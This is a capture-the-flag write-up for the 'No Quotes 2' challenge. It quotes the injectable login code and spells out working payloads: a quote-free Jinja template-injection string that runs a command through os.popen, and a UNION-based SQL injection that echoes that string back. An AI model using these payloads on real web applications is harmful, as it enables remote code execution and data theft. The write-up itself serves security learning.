# No Quotes 2

## Recon

### Changes from No Quotes

No quotes 2 is almost identical to the first no quotes but with two small changes. First, the SQL statement now gets the fields `username, password` instead of `id, password`. The second change is that the username and password returned by the SQL call are then validated by checking if they are equal to the ones in the initial request.

Relevant code snippets.

```
query = (
    "SELECT username, password FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

```
if not username == row[0] or not password == row[1]:
    return render_template(
        "login.html",
        error="Invalid credentials.",
        username=username,
    )
session["user"] = row[0]
```

## Exploit

### SSTI Payload

Because of our new restrictions, we need our username to already match our SSTI payload before it is processed by the SQL interpreter. This means we can't do something like `CHAR(83,83,84,73,...)` to get around the quotes blacklist. Looking at our original payload, we use quotes to define the strings `'os'` and `'../readflag'`. To get around this, we can instead generate these strings by appending `chr` function calls with the `+` operator.

Our new payload: `{{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.chr(111)+self.__init__.__globals__.__builtins__.chr(115)).popen(self.__init__.__globals__.__builtins__.chr(46)+self.__init__.__globals__.__builtins__.chr(46)+self.__init__.__globals__.__builtins__.chr(47)+self.__init__.__globals__.__builtins__.chr(114)+self.__init__.__globals__.__builtins__.chr(101)+self.__init__.__globals__.__builtins__.chr(97)+self.__init__.__globals__.__builtins__.chr(100)+self.__init__.__globals__.__builtins__.chr(102)+self.__init__.__globals__.__builtins__.chr(108)+self.__init__.__globals__.__builtins__.chr(97)+self.__init__.__globals__.__builtins__.chr(103)).read()}}`

### SQL Payload

```
SELECT username, password FROM users WHERE username = ('{username}') AND password = ('{password}')
```

Username: `{{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.chr(111)+self.__init__.__globals__.__builtins__.chr(115)).popen(self.__init__.__globals__.__builtins__.chr(46)+self.__init__.__globals__.__builtins__.chr(46)+self.__init__.__globals__.__builtins__.chr(47)+self.__init__.__globals__.__builtins__.chr(114)+self.__init__.__globals__.__builtins__.chr(101)+self.__init__.__globals__.__builtins__.chr(97)+self.__init__.__globals__.__builtins__.chr(100)+self.__init__.__globals__.__builtins__.chr(102)+self.__init__.__globals__.__builtins__.chr(108)+self.__init__.__globals__.__builtins__.chr(97)+self.__init__.__globals__.__builtins__.chr(103)).read()}}\`
Password: `) UNION SELECT 0x7b7b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313131292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6368722831313529292e706f70656e2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e636872283436292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e636872283436292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e636872283437292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313134292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313031292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e636872283937292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313030292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313032292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e63687228313038292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e636872283937292b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6368722831303329292e7265616428297d7d5c, SUBSTRING(info, LOCATE(0x292055, info), LOCATE(0x232729, info) - LOCATE(0x292055, info) + 1) FROM information_schema.processlist WHERE id=CONNECTION_ID() #`